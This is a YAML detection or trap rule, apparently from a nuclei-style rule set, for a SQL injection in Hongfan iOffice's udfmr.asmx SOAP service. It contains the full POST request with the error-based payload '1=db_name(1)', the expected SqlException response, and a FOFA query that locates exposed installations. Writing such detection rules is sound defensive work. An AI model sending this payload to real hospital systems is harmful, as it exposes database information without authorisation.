rules/nuclei/http/vulnerabilities/other/hongfan-ioffice-sqli.yaml

id: hongfan-ioffice-sqli
info:
  name: Hongfan OA udfmr.asmx - SQL injection
  author: SleepingBag945
  description: 'There is a SQL injection vulnerability in Hongfan iOffice 10 Hospital
    Edition, which can be exploited by attackers to obtain sensitive database information.

    '
  severity: high
  reference:
  - https://github.com/lal0ne/vulnerability/blob/main/%E7%BA%A2%E5%B8%86OA/iOffice_sqlscan/sql.py
  - https://github.com/MrWQ/vulnerability-paper/blob/master/bugs/%E3%80%90%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E3%80%91%E7%BA%A2%E5%B8%86%E5%8C%BB%E7%96%97%E4%BA%91%20OA%20udfmr.asmx%20SQL%20%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E.md
  metadata:
    verified: true
    max-request: 1
    fofa-query: app="红帆-ioffice"
  tags: hongfan,oa,sqli
traps:
- request:
    method: POST
    path: /iOffice/prg/set/wss/udfmr.asmx
    headers:
      Content-Type: text/xml; charset=utf-8
      SOAPAction: http://tempuri.org/ioffice/udfmr/GetEmpSearch
    body: |
      <?xml version="1.0" encoding="utf-8"?>
      <soap:Envelope xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
        <soap:Body>
          <GetEmpSearch xmlns="http://tempuri.org/ioffice/udfmr">
            <condition>1=db_name(1)</condition>
          </GetEmpSearch>
        </soap:Body>
      </soap:Envelope>
  response:
    status_code: 500
    headers: {}
    body: System.Data.SqlClient.SqlException:nvarchar
